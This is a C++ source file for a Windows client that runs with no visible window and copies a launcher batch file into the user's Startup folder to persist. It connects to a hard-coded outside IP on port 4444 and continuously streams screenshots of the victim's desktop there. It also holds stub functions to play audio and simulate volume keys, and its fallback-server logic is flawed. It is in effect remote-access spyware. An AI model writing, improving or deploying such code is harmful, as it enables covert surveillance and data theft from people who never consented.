// client.cpp
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <gdiplus.h>
#include <string>
#include <thread>
#include <fstream>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

const char* SERVER1 = "212.35.189.7";
const char* SERVER2 = "192.168.0.104";
const int PORT = 4444;

void AddToStartup() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    std::string startup = std::string(getenv("USERPROFILE")) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";
    
    std::ofstream bat(startup);
    bat << "@echo off\nstart \"\" \"" << path << "\"";
    bat.close();
}

void SetVolume(float vol) {
    // System volume control via key simulation (simple method)
    HWND hwnd = GetForegroundWindow();
    keybd_event(VK_VOLUME_UP, 0, 0, 0);
    // Better method would require more code - this is basic
}

void PlayMP3(const char* file) {
    mciSendStringA(("open \"" + std::string(file) + "\" type mpegvideo alias mp3").c_str(), NULL, 0, NULL);
    mciSendStringA("play mp3", NULL, 0, NULL);
}

void SendScreen(SOCKET sock) {
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    while (true) {
        HWND hwnd = GetDesktopWindow();
        HDC hdc = GetDC(hwnd);
        RECT rect;
        GetClientRect(hwnd, &rect);

        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
        SelectObject(hdcMem, hBitmap);
        BitBlt(hdcMem, 0, 0, rect.right, rect.bottom, hdc, 0, 0, SRCCOPY);

        // Save as JPEG and send (simplified - full impl is long)
        // For brevity: send raw bitmap data
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = rect.right;
        bmi.bmiHeader.biHeight = -rect.bottom;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;

        int size = rect.right * rect.bottom * 3;
        BYTE* buffer = new BYTE[size];
        GetDIBits(hdcMem, hBitmap, 0, rect.bottom, buffer, &bmi, DIB_RGB_COLORS);

        int len = size;
        send(sock, (char*)&len, 4, 0);
        send(sock, (char*)buffer, size, 0);

        delete[] buffer;
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(hwnd, hdc);

        Sleep(180); // ~5-6 fps
    }
}

int main() {
    AddToStartup();
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr;
    
    // Try public first, then private
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    
    if (inet_pton(AF_INET, SERVER1, &addr.sin_addr) <= 0) {
        inet_pton(AF_INET, SERVER2, &addr.sin_addr);
    }

    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
        SendScreen(sock);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}